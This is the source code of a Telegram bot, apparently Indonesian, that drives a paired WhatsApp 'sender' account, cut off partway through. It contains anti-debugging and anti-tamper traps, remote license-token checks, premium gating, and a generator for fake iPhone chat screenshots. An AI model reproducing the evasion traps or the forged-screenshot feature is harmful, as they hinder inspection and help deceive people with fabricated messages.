const { Telegraf } = require('telegraf');
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const dns = require("dns").promises;
const { URL } = require("url");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require("@bellachu/bails");
//============( CONST ) =======\\
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID, CHANNEL_USERNAME } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const thumbnailUrl = "https://files.catbox.moe/mgzg53.jpg";
//============( SAFE SOCK ) =======\\
function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}
//============( SECURITY ) =======\\
const databaseUrl = `https://raw.githubusercontent.com/buatscriptrafi/token/refs/heads/main/tokens.json`
function activateSecureMode() {
  secureMode = true;
}

async function loadTokensFromGithub() {
    try {
        const response = await axios.get(databaseUrl, { timeout: 10000 });
        const data = response.data;
        
        if (Array.isArray(data)) return data;
        if (data.tokens && Array.isArray(data.tokens)) return data.tokens;
        if (data.token) return [data.token];
        
        return [];
    } catch (error) {
        console.log(chalk.red('❌ Gagal load token dari GitHub:'), error.message);
        return [];
    }
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.red(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ██████╗ ██╗      ██████╗ ██████╗ ██╗   ██╗
██╔════╝ ██║     ██╔═══██╗██╔══██╗╚██╗ ██╔╝
██║  ███╗██║     ██║   ██║██████╔╝ ╚████╔╝
██║   ██║██║     ██║   ██║██╔══██╗  ╚██╔╝
╚██████╔╝███████╗╚██████╔╝██║  ██║   ██║
 ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝

███████╗██╗  ██╗██╗████████╗██╗   ██╗███████╗
██╔════╝╚██╗██╔╝██║╚══██╔══╝██║   ██║██╔════╝
█████╗   ╚███╔╝ ██║   ██║   ██║   ██║███████╗
██╔══╝   ██╔██╗ ██║   ██║   ██║   ██║╚════██║
███████╗██╔╝ ██╗██║   ██║   ╚██████╔╝███████║
╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝ ╚══════╝
`));
console.log(chalk.bold.yellow(`
» Developer: Rafi
» Version: 4.0.0`))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.red(`
  Bypass detected!!
  Your bypass tools are very bad idiot.
  `))
        activateSecureMode();
        hardExit(1);
      }    

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.red(`
⠀⠀Bypass detected!!
  Your bypass tools are very bad idiot.
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      hardExit(1);
    }
  }, 2000);
//============( VALIDATE TOKEN ) =======\\
  async function validateToken() {
    console.log(chalk.blue("🔍 Mengecek token di GitHub..."));

    try {
        const tokens = await loadTokensFromGithub();
        const isValid = tokens.includes(tokenBot);

        if (!isValid) {
            console.log(chalk.red(`
𝙳𝙴𝚅𝙾𝚄𝚁𝙸𝙽𝙶 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂 [ 𖣂 ]
❌ Your Bot Token Is Not Registered
— Please Contact The Owner
— @R4f14ndr4 ( Telegram )`
            ));
            process.stdin.pause();
            process.exitCode = 0;
            process.exit(0);
        }

        console.log(chalk.green("✅ Token Valid"));
        console.log(chalk.green("✅ Successfully Connected"));

        startBot();

        setInterval(async () => {
            try {
                const recheckTokens = await loadTokensFromGithub();
                if (!recheckTokens.includes(tokenBot)) {
                    console.log(chalk.red(`
                    𝙳𝙴𝚅𝙾𝚄𝚁𝙸𝙽𝙶 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂 [ 𖣂 ]
                    ❌ Your Bot Token Is Not Registered
                    — Please Contact The Owner
                    — @R4f14ndr4 ( Telegram )`
                    ));
                    process.exit(1);
                }
            } catch (err) {
                console.log(chalk.red("❌ Error recheck token:"), err.message);
            }
        }, 10000);

    } catch (err) {
        console.log(chalk.red("❌ Gagal validasi token:"), err.message);
        process.exit(1);
    }
}

function startBot() {
    console.log(chalk.cyan(`
✅ Bot Started!
    `));
}
validateToken();
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

//============( FEATURE ) =======\\
const bot = new Telegraf(tokenBot);

bot.use((ctx, next) => {
  if (secureMode) return;  
  return next();
});
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}
//============( CONNECT ) =======\\
const startSesi = async () => {
console.clear();
  console.log(chalk.bold.red(`
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⡸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣫⡶⣁⡣⡹⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣵⣏⡺⠳⢻⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣾⣿⢱⣿⣿⡆⢻⣭⣭⣭⣭⣭⣭⣭⣑⣻⣿⢸⣿⣧⠘⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣱⣿⣿⣿⡾⢿⠿⣫⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣮⣝⠇⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡟⡫⣰⣿⣿⣿⣿⣾⣾⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⡻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡛⣡⢜⣴⣹⣿⣿⣿⣿⣿⢻⡏⣿⡨⣻⣿⣿⣿⣿⣿⣿⣿⣻⣿⣿⣷⡽⣿⣿⣿⣿⣎⢿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⢋⣴⣿⠯⠼⣿⢻⣿⣿⣿⣿⡏⣧⣷⢹⣧⢷⡝⣿⣦⢻⣿⣿⣿⣷⢱⢻⣿⣷⢹⡻⣿⣿⡟⡆⢻⣿
⣿⣿⣿⣿⣿⣿⡟⢡⣾⣿⢧⡹⢿⡏⣺⣛⣛⡻⣿⢳⢿⣿⠈⣿⢸⣿⡜⣿⡌⣿⡿⢿⠿⣦⠞⡿⣫⣄⢇⢹⡗⣶⣯⢁⢿
⣿⣿⣿⣿⣿⡟⢠⣿⣿⡏⣾⣿⣿⢹⣯⣾⣯⣵⡟⠘⠙⠌⡇⡿⢸⣿⣿⢩⠃⢹⣧⣧⣯⢻⠒⣵⡿⢹⡾⡆⣿⣿⣿⡇⡼
⣿⣿⣿⣿⣿⠱⣸⣿⣿⢱⣿⣿⡇⣾⣿⣿⣿⣿⡏⣾⠟⣰⠇⠁⠛⠿⡿⡿⢃⠘⣡⣠⡀⠈⠀⠀⢀⠙⠃⢱⣿⣿⣿⠇⢁
⣿⣿⣿⣿⣿⡄⣿⣿⡿⣼⣿⣿⢳⣿⣿⣿⣿⣿⡇⣫⠞⣩⡤⠶⢦⣄⣵⣷⣿⣿⣿⣿⣧⠆⠷⠀⠈⠻⣦⠸⣿⣹⡿⣸⣸
⣿⣿⣿⣿⣇⡇⣿⣿⡇⣿⣿⣿⣸⣿⣿⣿⣿⣿⡇⢡⣿⠻⠆⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⣻⡆⢿⣧⡌⢿⣿
⣿⣿⣿⣿⣿⣐⢹⣿⡇⣿⣿⡏⣿⣿⣿⣿⣿⣿⡇⢻⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣆⡀⠀⠀⣠⣿⣾⣌⢿⣿⡜⣿
⣿⣿⣿⣿⣿⣧⠈⣿⣧⢿⣿⡇⣿⣿⣿⣿⣿⣿⡇⣮⣻⣧⣀⢀⣀⣤⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⣫⣱⡻⡝⡌⣿⣷⢹
⣿⣿⣿⣿⣿⣿⣷⣜⢻⠸⣿⣇⣿⣿⣿⣿⣿⣿⣧⢸⡽⣝⡴⣜⠝⣿⡻⣿⠿⠿⠛⠛⡛⠛⢛⢫⣷⣱⣓⣙⣙⣽⢸⣿⡏
⣿⣿⣿⣿⣿⣿⣿⣿⣷⣇⢻⣿⢹⡿⣿⣿⣿⣿⣿⠘⣮⣾⣮⣮⣾⡿⠀⣀⣀⣦⣥⣒⣀⠁⠂⠄⣿⣿⣿⣿⣿⢏⣿⣿⡇
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢘⣿⡼⣇⣿⣿⣿⣿⣿⡞⣹⣿⣿⣿⣿⡇⣾⣿⣿⣿⣿⣿⣿⣿⣷⣀⣿⣿⣿⢟⣱⣿⣿⣿⡇
⣿⢿⣿⡿⣟⢛⣛⢛⠻⣿⢸⣿⣧⢿⣹⣿⣿⣿⣿⣧⢣⠻⣿⣿⣿⣿⣎⡻⠿⣿⠿⠿⣟⣛⣽⠾⡟⡫⣷⣿⣿⢻⡟⣶⠁
⣿⢀⣵⣯⣾⣿⢣⣾⣿⣿⢘⡿⠿⡎⣧⢿⣿⠟⡿⢱⡔⠑⠄⠉⠉⢻⣿⣿⣿⡿⡟⠋⠉⠑⢶⣿⡇⡇⣿⣿⣾⣶⣾⠏⢳
⢣⣿⣺⣽⣽⡁⣿⣿⣿⡿⣠⣇⣧⣿⡘⣜⣿⣵⣷⣿⣦⠀⠀⠀⠀⠀⠛⡿⢿⠿⠀⠀⠀⠀⢠⡹⠳⣳⢿⣿⣿⣿⢏⠆⣾
⢸⣿⣿⣿⣿⡇⢻⣿⣿⢇⣿⣿⡏⣿⣿⣜⢪⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠐⠶⠃⠀⠀⠀⠀⠸⡳⣜⢏⣿⣿⢟⣵⣿⣾⣿
`));
console.log(chalk.bold.yellow(`
» Developer: Rafi
» Version: 4.0.0`))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Evox',
        }),
    };
    
    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `\`\`\`js
PROSES PAIRING
☐ Number: ${lastPairingMessage.phoneNumber}
☐ Pairing Code: ${lastPairingMessage.pairingCode}
☐ Type: Connected
\`\`\``;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "Markdown" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`Sender Connected`))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();
//============( CHECK ) =======\\

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};



//============( COMMAND FEATURE ) =======\\
bot.command("addsender", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addsender 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

      const code = await sock.requestPairingCode(phoneNumber, "RAFI1234");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `\`\`\`js
PROSES PAIRING
☐ Number: ${phoneNumber}
☐ Pairing Code: ${formattedCode}
☐ Type: Not Connected
\`\`\``;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "Markdown"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `\`\`\`js
PROSES PAIRING
☐ Number: ${lastPairingMessage.phoneNumber}
☐ Pairing Code: ${lastPairingMessage.pairingCode}
☐ Type: Connected
\`\`\``;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "Markdown" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcooldown", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcooldown 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgroup', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgroup -12345678 30");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgroup', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delggroup -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

bot.command("iqc", checkPremium, async (ctx) => {
                const chatId = ctx.chat.id;
                const userId = ctx.from.id.toString();
                const args = ctx.message.text.split(" ");

               
                const fullText = ctx.message.text.replace(/^\/iqc\s+/i, "");
                const [input, batteryInput] = fullText.split(",").map(s => s?.trim());

                if (!input || !batteryInput) {  
                        return ctx.reply(  
                                "❌ Incorrect format.\n\nExample:\n/iqc Deryanthetalent,188",  
                                { parse_mode: "Markdown" }  
                        );  
                }  

                const battery = parseInt(batteryInput);
                if (isNaN(battery) || battery < 0 || battery > 100) {
                        return ctx.reply("❌ Battery must be a number between 0–100.", { parse_mode: "Markdown" });
                }

                const hours = Math.floor(Math.random() * 24).toString().padStart(2, '0');  
                const minutes = Math.floor(Math.random() * 60).toString().padStart(2, '0');  
                const time = `${hours}:${minutes}`;  
                  
                const carriers = ["TELKOMSEL", "INDOSAT OOREDOO", "XL AXIATA", "SMARTFREN", "IM3 (THREE)", "BY.U"];  
                const carrier = carriers[Math.floor(Math.random() * carriers.length)];  
                const signalStrength = Math.floor(Math.random() * 4) + 1;  

                const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(input)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=${signalStrength}&emojiStyle=apple`;  

                try {  
                        await ctx.replyWithChatAction("upload_photo");  

                        const response = await axios.get(apiUrl, { responseType: "arraybuffer" });    
                        const buffer = Buffer.from(response.data, "binary");    

                        await ctx.replyWithPhoto(  
                                { source: buffer },  
                                {  
                                        caption: `-# *iPhone Quoted Generator*\n\n💬 ${input}\n🕒 ${time} | 🔋 ${battery}% | 📡 ${carrier}`,  
                                        parse_mode: "Markdown",  
                                        reply_markup: {  
                                                inline_keyboard: [  
                                                        [{ text: "Tokisaki", url: "https://t.me/Testimonideryan" }]  
                                                ]  
                                        }  
                                }  
                        );  
                } catch (err) {  
                        console.error(err.message);  
                        ctx.reply("❌ Terjadi kesalahan saat memproses gambar.");  
                }
});

bot.command("tourl", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply media (foto/video/audio/dokumen) dengan perintah /tourl");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else if (reply.video) {
      fileId = reply.video.file_id;
    } else if (reply.audio) {
      fileId = reply.audio.file_id;
    } else if (reply.document) {
      fileId = reply.document.file_id;
    } else {
      return ctx.reply("❌ Format file tidak didukung. Harap reply foto/video/audio/dokumen.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: path.basename(fileLink.href),
      contentType: "application/octet-stream",
    });

    const uploadRes = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    const url = uploadRes.data;
    ctx.reply(`✅ File berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ Gagal tourl:", err.message);
    ctx.reply("❌ Gagal mengupload file ke URL.");
  }
});


let blockedCommands = [];

const getBlocked = () => blockedCommands;

// PERINTAH UTAMA /BLOCKCMD
bot.command("command", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  
  const args = ctx.message.text.trim().split(" ").slice(1);
  const aksi = args[0]?.toLowerCase();
  const target = args[1]?.toLowerCase();

  if (!aksi) return ctx.reply(`🪧 ☇ Cara Pakai:
/command block <perintah> → Blokir
/command unblock <perintah> → Buka blokir
/command list → Lihat daftar`);

  // Tambah blokir
  if (aksi === "block") {
    if (!target) return ctx.reply("⛔ Masukkan nama perintah yang mau diblok!");
    if (blockedCommands.includes(target)) return ctx.reply(`⛔ /${target} sudah diblokir!`);
    blockedCommands.push(target);
    return ctx.reply(`✅ Berhasil blokir /${target}!`);
  }

  // Buka blokir
  if (aksi === "unblock") {
    if (!target) return ctx.reply("⛔ Masukkan nama perintah yang mau dibuka!");
    if (!blockedCommands.includes(target)) return ctx.reply(`⛔ /${target} tidak ada di daftar blokir!`);
    blockedCommands = blockedCommands.filter(c => c !== target);
    return ctx.reply(`✅ Berhasil buka blokir /${target}!`);
  }

  // Lihat daftar
  if (aksi === "list") {
    return ctx.reply(`📋 Daftar Perintah Diblokir:
${blockedCommands.length ? blockedCommands.map(c => `• /${c}`).join("\n") : "Tidak ada perintah yang diblokir"}`);
  }
});

// PERINTAH TAMBAHAN /UNBLOCKCMD
bot.command("unblockcmd", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  
  const target = ctx.message.text.split(" ")[1]?.toLowerCase();
  if (!target) return ctx.reply("🪧 ☇ Format: /unblockcmd <namaperintah>");
  if (!blockedCommands.includes(target)) return ctx.reply(`⛔ /${target} tidak diblokir!`);
  blockedCommands = blockedCommands.filter(c => c !== target);
  return ctx.reply(`✅ /${target} sudah dibuka!`);
});


// ===== /cekfunc =====
bot.command("cekfunc", async (ctx) => {
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text) {
    return ctx.reply(
      "❌ Cara pakai:\nReply kode JS lalu ketik:\n/cekfunc"
    );
  }

  const code = ctx.message.reply_to_message.text;

  // Bungkus biar async aman
  const wrappedCode = `
    (async () => {
      ${code}
    })();
  `;

  try {
    // SYNTAX CHECK ONLY
    new vm.Script(wrappedCode);

    // SUCCESS RESPONSE
    const successMsg = `\`\`\`js
🟢 <b>SYNTAX CHECK: PASSED</b>

✅ <b>Status:</b> Aman, tidak ditemukan error syntax
🧠 <b>Parser:</b> Node.js V8 Engine
📦 <b>Mode:</b> Async Function Wrapper
🔐 <b>Execution:</b> Diblokir (Syntax-only)

📊 <b>Analisis Singkat:</b>
• Struktur kode valid
• Kurung & scope seimbang
• Keyword JavaScript dikenali
• Siap dieksekusi tanpa crash syntax

🚀 <b>Kesimpulan:</b>
Kode lu <i>clean</i>, <i>aman</i>, dan <i>lanjut ke tahap logic</i>.
Gagah Si Eta, developer 😎🔥
\`\`\``;

